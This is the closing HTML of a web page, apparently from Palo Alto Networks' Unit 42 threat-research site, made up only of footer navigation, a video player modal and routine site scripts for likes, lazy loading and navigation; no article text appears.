							<a href="https://www.paloaltonetworks.com/about-us"   role="link" title="About Us" data-page-track="true" data-page-track-value="footer:Company:About Us">About Us</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://jobs.paloaltonetworks.com/en/"   role="link" title="Careers" data-page-track="true" data-page-track-value="footer:Company:About Us:Careers">Careers</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/company/contact-sales"   role="link" title="Contact Us" data-page-track="true" data-page-track-value="footer:Company:About Us:Careers:Contact Us">Contact Us</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/about-us/corporate-responsibility"   role="link" title="Corporate Responsibility" data-page-track="true" data-page-track-value="footer:Company:About Us:Careers:Contact Us:Corporate Responsibility">Corporate Responsibility</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/customers"   role="link" title="Customers" data-page-track="true" data-page-track-value="footer:Company:About Us:Careers:Contact Us:Corporate Responsibility:Customers">Customers</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://investors.paloaltonetworks.com/" target=_blank  role="link" title="Investor Relations" data-page-track="true" data-page-track-value="footer:Company:About Us:Careers:Contact Us:Corporate Responsibility:Customers:Investor Relations">Investor Relations</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/about-us/locations"   role="link" title="Location" data-page-track="true" data-page-track-value="footer:Company:About Us:Careers:Contact Us:Corporate Responsibility:Customers:Investor Relations:Location">Location</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/company/newsroom"   role="link" title="Newsroom" data-page-track="true" data-page-track-value="footer:Company:About Us:Careers:Contact Us:Corporate Responsibility:Customers:Investor Relations:Location:Newsroom">Newsroom</a>
						</li>    
					        
					</ul>
				</nav>
						          </div>
          </div>
        </div>
        <div class="footer-menu-nav__wrapper">
                      <h3 class="footer-menu-nav__title">Popular links</h3>
                                <div class="nav-column__wrapper">
          <div class="nav-column">
            													<nav>
					<ul class="footer-menu-nav__list"> 
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/blog/"   role="link" title="Blog" data-page-track="true" data-page-track-value="footer:Popular links:Blog">Blog</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/communities"   role="link" title="Communities" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities">Communities</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/resources"   role="link" title="Content Library" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library">Content Library</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/cyberpedia"   role="link" title="Cyberpedia" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia">Cyberpedia</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://events.paloaltonetworks.com/"   role="link" title="Event Center" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center">Event Center</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://start.paloaltonetworks.com/preference-center"   role="link" title="Manage Email Preferences" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center:Manage Email Preferences">Manage Email Preferences</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/products/products-a-z"   role="link" title="Products A-Z" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center:Manage Email Preferences:Products A-Z">Products A-Z</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/legal-notices/trust-center/tech-certs"   role="link" title="Product Certifications" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center:Manage Email Preferences:Products A-Z:Product Certifications">Product Certifications</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/security-disclosure"   role="link" title="Report a Vulnerability" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center:Manage Email Preferences:Products A-Z:Product Certifications:Report a Vulnerability">Report a Vulnerability</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/sitemap"   role="link" title="Sitemap" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center:Manage Email Preferences:Products A-Z:Product Certifications:Report a Vulnerability:Sitemap">Sitemap</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://docs.paloaltonetworks.com/"   role="link" title="Tech Docs" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center:Manage Email Preferences:Products A-Z:Product Certifications:Report a Vulnerability:Sitemap:Tech Docs">Tech Docs</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://unit42.paloaltonetworks.com/"   role="link" title="Unit 42" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center:Manage Email Preferences:Products A-Z:Product Certifications:Report a Vulnerability:Sitemap:Tech Docs:Unit 42">Unit 42</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://panwedd.exterro.net/portal/dsar.htm?target=panwedd" target=_blank  role="link" title="Do Not Sell or Share My Personal Information" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center:Manage Email Preferences:Products A-Z:Product Certifications:Report a Vulnerability:Sitemap:Tech Docs:Unit 42:Do Not Sell or Share My Personal Information">Do Not Sell or Share My Personal Information</a>
						</li>    
					        
					</ul>
				</nav>
						          </div>
          </div>
        </div>
      </div>
    </div>
  </div>
  <div class="footer-bottom"> 
    <div class="l-container"> 
              <div class="footer-logo">
          <a href="https://www.paloaltonetworks.com/" role="link" title="Footer Nav" data-page-track="true" data-page-track-value="footer:logo:Palo Alto Networks">
            <img width="245" height="46" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/palo-alto-footer-logo.svg" class="attachment-medium size-medium" alt="" decoding="async" loading="lazy" />          </a>
        </div>
            <div class="footer-bottom__wrapper"> 
        <div class="footer-bottom-nav">
                                              <nav>
                <ul class="footer-menu-nav__list"> 
                                                    <li> 
                   <a href="https://www.paloaltonetworks.com/legal-notices/privacy"   role="link" title="Privacy" data-page-track="true" data-page-track-value="footer:bottom-menu:Privacy">Privacy</a>
                  </li>    
                                                    <li> 
                   <a href="https://www.paloaltonetworks.com/legal-notices/trust-center"   role="link" title="Trust Center" data-page-track="true" data-page-track-value="footer:bottom-menu:Trust Center">Trust Center</a>
                  </li>    
                                                    <li> 
                   <a href="https://www.paloaltonetworks.com/legal-notices/terms-of-use"   role="link" title="Terms of Use" data-page-track="true" data-page-track-value="footer:bottom-menu:Terms of Use">Terms of Use</a>
                  </li>    
                                                    <li> 
                   <a href="https://www.paloaltonetworks.com/legal"   role="link" title="Documents" data-page-track="true" data-page-track-value="footer:bottom-menu:Documents">Documents</a>
                  </li>    
                        
                </ul>
              </nav>
                                            <br/><span class="copyright">Copyright © 2024 Palo Alto Networks. All Rights Reserved</span>
                  </div>
        <div class="footer-bottom-social"> 
          <ul> 
			<li>
			<a href="https://www.youtube.com/user/paloaltonetworks" target="_blank" role="link" title="YouTube" data-page-track="true" data-page-track-value="footer:social:Youtube">
				<img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/youtube-black.svg" alt="YouTube">
			</a>
		</li>
				<li> 
			<a href="https://twitter.com/Unit42_Intel" target="_blank" role="link" title="X" data-page-track="true" data-page-track-value="footer:social::Twitter">
				<img  class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/x-icon-black.svg" alt="Twitter">
			</a>
		</li>
				<li> 
			<a href="https://www.facebook.com/PaloAltoNetworks/" target="_blank" role="link" title="Facebook" data-page-track="true" data-page-track-value="footer:social:Facebook">
				<img  class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/Facebook_Icon.svg" alt="Facebook">
			</a>
		</li>
				<li> 
			<a href="https://www.linkedin.com/company/palo-alto-networks" target="_blank" role="link" title="LinkedIn" data-page-track="true" data-page-track-value="footer:social:LinkedIn">
				<img  class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/LinkedIn_Icon.svg" alt="LinkedIn">
			</a>
		</li>
	                <li> 
			<a href="https://unit42.paloaltonetworks.com/unit-42-threat-vector-podcast/" role="link" title="Podcast" data-page-track="true" data-page-track-value="footer:social:Podcast">
                            <img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/Podcast.svg" alt="Podcast">
			</a>
		</li>
</ul>          
	<div class="pa language-dropdown">
			<div class="language-dropdown__wrapper"> 
			<img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/globe-icon.svg" alt="Globe icon">
			<span id="selectedLanguage">EN</span>
			<img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/down-arrow.svg" alt="Down arrow"><ul><li class="title">Select your language</li>
					<li class="selected" data-value="en"> 
						<a data-page-track="true" data-page-track-value="footer:language-selector:en" href="https://unit42.paloaltonetworks.com/unit42-smoking-rarog-mining-trojan/">USA (ENGLISH)</a>
					</li>
					<li class="non-active" data-value="en"> 
						<a data-page-track="true" data-page-track-value="footer:language-selector:ja" href="https://unit42.paloaltonetworks.jp/unit42-smoking-rarog-mining-trojan/">JAPAN (日本語)</a>
					</li></ul>        </div>
      </div>
    </div>
  </div>
</footer>
<div class="dd-overlay">
</div>
<!--  Start: video modal -->
<div class="modal video__modal" id="videoModal" tabindex="-1">
        <div class="modal__video-wrapper">
          <button class="modal__play-btn is-minimized is-paused" id="playPauseBtn">
            <img class="play" src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/player-play-icon.svg" alt="Play">
            <img class="pause" src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/player-pause-icon1.svg" alt="Pause">
          </button>
          <button class="modal__minimize-btn is-minimized">
            <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-minimize.svg" alt="Minimize">
          </button>
          <button class="modal__close"> 
            <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/close-modal.svg" alt="Close button">
          </button>
          <video class="modal__video" id="customVideo">
            <source src="" type="video/mp4">Your browser does not support the video tag.
          </video>
          <div class="modal__post-details" tabindex="-1">       
              <h3>Default Heading</h3>
              <a class="l-btn" href="#" title="Right Arrow Icon" role="link" data-page-track="true" data-page-track-value="overview:explore reports:View all reports">Read the article
              <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/right-arrow.svg" alt="Right Arrow">
              </a>
          </div>
          <div class="modal__video-controls">
            <div class="modal__video-seekbar input__wrapper"><span></span>
              <label class="is-hidden" for="modalSeekBar">Seekbar</label>
              <input class="custom-range" id="modalSeekBar" type="range" min="0" max="100" value="1">
              <p class="modal__remaining-time"></p>
            </div>
            <button class="modal__play-btn is-paused" id="playPauseBtn">
            <img class="play" src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/player-play-icon.svg" alt="Play">
            <img class="pause" src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/player-pause-icon1.svg" alt="Pause">
          </button>
            <div class="modal__volume-controls">
              <div class="modal__volume__wrapper">
                <button tabindex="0">
                  <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-volume.svg" alt="Volume">
                </button>
                <div class="modal__volume-seekbar"><span></span>
                  <label class="is-hidden" for="volumeBar">Volume</label>
                  <input class="volume__bar" id="volumeBar" type="range" min="0" max="1" step="0.1" value="0.7">
                </div>
              </div>
              <button class="modal__minimize-btn" id="minimizeBtn">
                <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-minimize.svg" alt="Minimize">
              </button>
            </div>
          </div>
        </div>
      </div><!--  End: video modal -->

    <script type="text/javascript">
	var isProcessing = false; 
    function alter_ul_post_values(obj,post_id,ul_type){
	
		if (isProcessing)    
		return;  
		isProcessing = true;   
		var like_nonce = jQuery('#_wpnonce').val();
		jQuery(obj).find("span").html("..");
                jQuery.ajax({
                    type: "POST",
                    url: "https://unit42.paloaltonetworks.com/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php",
                    data: "post_id="+post_id+"&up_type="+ul_type+"&ul_nonce="+like_nonce,
                    success: function(msg){
                            jQuery(obj).find("span").html(msg);
                            isProcessing = false; 
                            jQuery(obj).find('svg').children('path').attr('stroke','#0050FF');
                            jQuery(obj).removeClass('idc_ul_cont_not_liked idc_ul_cont_not_liked_inner');
                    }
 		});
	}
	</script>
    <link rel='stylesheet' id='wpdevart_lightbox_front_end_css-css' href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/wpdevart_lightbox_front.css?ver=6.6.2' media='all' />
<script src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/js/script.js?ver=1.0.0" id="unit42-v6-navigation-js"></script>

<!--  Start: Scripts Migrated From Unit42-v5 -->
<script type="text/javascript">
const observer_lozad = lozad('.lozad, .lozad-background'); // lazy loads elements with default selector as '.lozad'
observer_lozad.observe();

window.PAN_Clean_Util = {
        isIE: false
};

(function () {
   // INP Util Fix
    function yieldToMain(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
   window.PAN_Clean_Util.yieldToMain = yieldToMain
})();

if(referer == "Prisma" || referer == "Cortex" || referer == "Sase" || referer == "Unit" || referer == "Ngfw"){
  var Coveo_organizationId = "paloaltonetworksintranet";        
  var techDocsPagePath = "https://docs.paloaltonetworks.com/search.html#hd=All%20Prisma%20Cloud%20Documentation&hq=%40panproductcategory%3D%3D(%22Prisma%20Cloud%22)&sort=relevancy&layout=card&numberOfResults=25";
  var languageFromPath="en_US";
  window.Granite = window.Granite || {};
  Granite.I18n = (function() {
  var self = {};
  self.setLocale = function(locale) { };
  self.get = function(text, snippets, note) {
    var out = "";
    if(text){
      if(text ==="coveo.clear"){
        out = "Clear";
      }else if(text ==="coveo.noresultsfound"){
        out = "No results found for this search term.";
      }
    }
    return out;
  };
  return self
  }());
}

  var main_site_critical_top = maindomain_lang+'/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/criticalTop.min.js';
  var main_site_defered = maindomain_lang+'/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/defered.min.js';
  var main_site_criticalTopBase = maindomain_lang+'/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/criticalTopBase.min.js';
  var main_site_criticalTopProductNav = maindomain_lang+'/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/criticalTopProductNav.min.js';
window.PAN_MainNavAsyncUrl = maindomain_lang+"/_jcr_content/globals/cleanHeaderPrisma.prismaRenderer.html";

function loadScript(url, defer){
    var script1 = document.createElement('script');
    script1.setAttribute('type', 'text/javascript');
    script1.setAttribute('src',url);
    if(defer == true){
        script1.setAttribute('defer','defer');
    }
    document.head.appendChild(script1);
}
function loadScript1(url, callback){

    var script = document.createElement("script")
    script.type = "text/javascript";
    if (script.readyState){  //IE
        script.onreadystatechange = function(){
            if (script.readyState == "loaded" || script.readyState == "complete"){
                script.onreadystatechange = null;
                callback();
            }
        };
    } else {  //Others
        script.onload = function(){
            callback();
        };
    }
    script.src = url;
    document.getElementsByTagName("head")[0].appendChild(script);
}
if(referer == "Prisma" || referer == "Cortex" || referer == "Sase" || referer == "Unit" || referer == "Ngfw"){
	if(referer == "Unit"){
    setTimeout(function(){
      loadScript(main_site_criticalTopBase, false);
      loadScript1(main_site_criticalTopProductNav, function(){
        window.PAN_initializeProduct2021Nav();
      });
      loadScript(main_site_defered, false);
    }, 3000);
	}
	else{
    setTimeout(function(){
      loadScript1(main_site_critical_top, function(){
        window.PAN_initializeProduct2021Nav();
      });
      loadScript(main_site_defered, false);
    }, 3000);
	}
}

$(document).ready(function () {
    setTimeout(function(){
      $('.article-banner .ab__options ul li a').each(function(){
          	$(this).attr('target', "_blank");
      });
    }, 4000);
});
</script>
<!--  End: Scripts Migrated From Unit42-v5 -->

</body>
</html>
